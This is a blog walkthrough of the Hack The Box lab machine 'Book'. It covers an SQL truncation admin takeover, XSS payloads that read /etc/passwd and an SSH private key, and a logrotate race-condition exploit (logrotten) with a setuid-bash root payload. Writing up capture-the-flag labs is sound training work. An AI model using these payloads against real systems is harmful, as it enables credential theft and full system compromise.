---
"title": "Hack The Box - Book"
"date": 2020-07-11
"tags": ["linux", "medium", "xss", "logrotate", "sql", "cron"]
"keywords": ["linux", "medium", "xss", "logrotate", "sql", "cron"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Book is an Medium Linux Box, Getting Initial is login as admin by sql truncation method and then further exploiting it by Reflected XSS and getting user ssh keys. And Root is exploiting Logrotate, This box is really fun."
"featured_image": "/img/htb-book/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-book/Untitled.png)

Book is an Medium Linux Box, Getting Initial is login as admin by sql truncation method and then further exploiting it by Reflected XSS and getting user ssh keys. And Root is exploiting Logrotate, This box is really fun.

Link : [https://www.hackthebox.eu/home/machines/profile/230](https://www.hackthebox.eu/home/machines/profile/230)

Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 3.8 (92%), QNAP QTS 4.0 - 4.2 (92%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.10 (92%), Linux 2.6.32 - 3.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP Enumeration

It is a login page. And We have a `Signup` option, So let’s try creating an new account.

![Untitled](/img/htb-book/2.png)

Account created!

![Untitled](/img/htb-book/3.png)

We logged in as `test`, After some enumeration, I found there are some `pdf` in `books` we can download. And `admin` mail address `admin@book.htb` from `Contact Us`.

![Untitled](/img/htb-book/4.png)

And Book Submission, I Immediately tried uploading a sample pdf.

![Untitled](/img/htb-book/5.png)

It looks like the `admin` needs to accept our file.

![Untitled](/img/htb-book/6.png)

I decided to run Gobuster to find any directories.

### Gobuster Result

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.176
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html
[+] Timeout:        10s
===============================================================
2020/03/17 14:36:31 Starting gobuster
===============================================================
/admin (Status: 301)
/books.php (Status: 302)
/contact.php (Status: 302)
/db.php (Status: 200)
/docs (Status: 301)
/download.php (Status: 302)
/feedback.php (Status: 302)
/home.php (Status: 302)
/images (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/logout.php (Status: 302)
/profile.php (Status: 302)
/search.php (Status: 302)
/server-status (Status: 403)
/settings.php (Status: 302)
===============================================================
2020/03/17 14:43:29 Finished
===============================================================
```

The only thing that come to eyes is `/admin`, So it is an admin login page.

![Untitled](/img/htb-book/7.png)

Since we know is mail address, I tried some default passwords but didn’t work. So I decided to create a new account with the same mail address.

Used `admin@book.htb` as we saw previously from `Contact Us` in the user panel.

![Untitled](/img/htb-book/8.png)

We get User Exists

![Untitled](/img/htb-book/9.png)

After some attempts and googling I found this article.

> https://resources.infosecinstitute.com/sql-truncation-attack/#gref

To learn more about SQL Truncation > [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html)

In our scenario, First, we need to check the character limit in the source code of the Signup page. And the limit is 20.

```
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
```

By following this, Captured the Sign-Up page in burp and send that to the repeater. Added some space and some string after the mail address so what will now happen is when we exceed the character limit which is 20 and it will crop and store the value in a truncated form.

![Untitled](/img/htb-book/10.png)

And I got 302 Redirection.

If I follow the redirection I got 200 Ok which means the account created.

![Untitled](/img/htb-book/11.png)

Let’s try login as `admin@book.htb : admin` in `/admin`

![Untitled](/img/htb-book/12.png)

We are successfully logged into the admin panel.

![Untitled](/img/htb-book/13.png)

While checking the admin panel, In Collection Tab we can see the `Collections PDF` which contains the PDF that is uploaded in `/books.php`. So I uploaded a PDF in the `User` account and checked what changes in the `Admin` account.

![Untitled](/img/htb-book/14.png)

User Account:

![Untitled](/img/htb-book/15.png)

Admin Account:

![Untitled](/img/htb-book/16.png)

We can see that the `author` and `book` name is reflecting in the pdf.

After some research, I came to know we can do XSS because the content we are providing in `User` account is got reflecting in `Admin` Collection Pdf. I searched for any exploits and found this.

> https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1

So We can inject in `author` and `book` name, I started my testing with this.

```
[img src=x onerror=document.write('0xw0lf')](img src=x onerror=document.write('0xw0lf'))
```

User Account:

![Untitled](/img/htb-book/17.png)

Admin Account:

![Untitled](/img/htb-book/18.png)

Its working so try getting `/etc/passwd`

```
[script](script)x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();[/script](/script)
```

## Getting User Shell

User Account:

![Untitled](/img/htb-book/19.png)

Admin Account:

![Untitled](/img/htb-book/20.png)

Yeah we got it and found user `reader`, So why don’t we try getting `reader` ssh private key.

```
[script](script)x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();[/script](/script)
```

It Worked and I logged in as `reader` (No Password) and got User Flag.

![Untitled](/img/htb-book/21.png)

## Privilege Escalation

After some enumeration, I uploaded `pspy` to check any process running in the background.

> pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

I get to know that `Logrotate` service is running as root.

![Untitled](/img/htb-book/22.png)

### What is Logrotate?

> In information technology, log rotation is an automated process used in system administration in which log files are compressed, moved, renamed or deleted once they are too old or too big. New incoming log data is directed into a new fresh file.

We can find log files of logrotate in `/var/lib/logrotate/status`.

```
reader@book:/tmp$ cat /var/lib/logrotate/status 
logrotate state -- version 2
"/var/log/syslog" 2020-3-18-6:25:2
"/var/log/dpkg.log" 2020-3-18-6:25:2
"/var/log/unattended-upgrades/unattended-upgrades.log" 2020-3-18-6:25:2
"/var/log/unattended-upgrades/unattended-upgrades-shutdown.log" 2020-3-18-6:25:2
"/var/log/auth.log" 2020-3-18-6:25:2
"/var/log/apt/term.log" 2020-3-18-6:25:2
"/var/log/apport.log" 2020-3-18-6:0:0
"/var/log/apt/history.log" 2020-3-18-6:25:2
"/var/log/mysql/error.log" 2020-3-18-6:25:2
"/var/log/alternatives.log" 2020-3-18-6:25:2
"/var/log/mail.log" 2020-3-18-6:0:0
"/var/log/debug" 2020-3-18-6:0:0
"/var/log/kern.log" 2020-3-18-6:25:2
"/var/log/mysql.log" 2020-3-18-6:0:0
"/var/log/aptitude" 2020-3-18-6:0:0
"/var/log/apache2/access.log" 2020-3-18-6:25:2
"/var/log/ufw.log" 2020-3-18-6:0:0
"/var/log/wtmp" 2020-3-18-6:25:2
"/var/log/daemon.log" 2020-3-18-6:0:0
"/var/log/mail.warn" 2020-3-18-6:0:0
"/var/log/btmp" 2020-3-18-6:25:2
"/var/log/mail.err" 2020-3-18-6:0:0
"/var/log/lpr.log" 2020-3-18-6:0:0
"/var/log/unattended-upgrades/unattended-upgrades-dpkg.log" 2020-3-18-6:25:2
"/var/log/user.log" 2020-3-18-6:0:0
"/var/log/mail.info" 2020-3-18-6:0:0
"/home/reader/backups/access.log" 2020-1-29-13:5:29
"/var/log/lxd/lxd.log" 2020-3-18-6:0:0
"/var/log/apache2/other_vhosts_access.log" 2019-11-20-6:0:0
"/var/log/apache2/error.log" 2020-3-18-6:25:2
"/var/log/cron.log" 2020-3-18-6:0:0
"/var/log/messages" 2020-3-18-6:0:0
```

Among these only `/home/reader/backups/access.log` file we have write permission.

I started checking for exploits and found this.

### Reference:

> https://github.com/whotwagner/logrotten

> https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition

So according to the article, Logrotate uses Race-Condition when multiple threads try to access shared data. Since logrotate was running for keeping the loggings of action by the root user, and the log directory path which was `/home/reader/backups/access.log`, what we had to do was, since logrotate had a number of race condition bugs previously reported to it, all we had to do is do a symlink, create a systematic link between files so that the file we created(Payload) should be provided as a systematic link to that of the ones we had access to, in our case `access.log`.

The logrotten exploit is a POC that exploit the race condition:-

```
while(1)
{
  i=0;
  length = read( fd, buffer, EVENT_BUF_LEN ); 
 
  while (i < length) {     
      struct inotify_event *event = ( struct inotify_event * ) &buffer[ i ];     if ( event->len ) {
      if ( event->mask & IN_MOVED_FROM ) {
      if(strcmp(event->name,p) == 0)
      {
            /* printf( "Something is moved %s.\n", event->name ); */
            rename(logpath,logpath2);
            symlink(targetdir,logpath);
        sleep(1);
        source = fopen(payloadfile, "r");        
        if(source == NULL)
            exit(EXIT_FAILURE);
```

It creates a symlink, to that of payload file, for example:- Payload:

```
if [ `id -u` -eq 0 ]; then (cp /bin/bash /tmp;chmod 4755 /tmp/bash);
fi
```

Compile:

```
gcc -o logrotten logrotten.c
```

I compiled it in my machine and uploaded. To run that exploit we need to give the log file path which is `/home/reader/backups/access.log`, Let’s run the exploit.

Now we need to wait for logrotate to `access.log` the actions, I did that by `echo "Give me Root" > access.log`

![Untitled](/img/htb-book/23.png)

I’m Root!!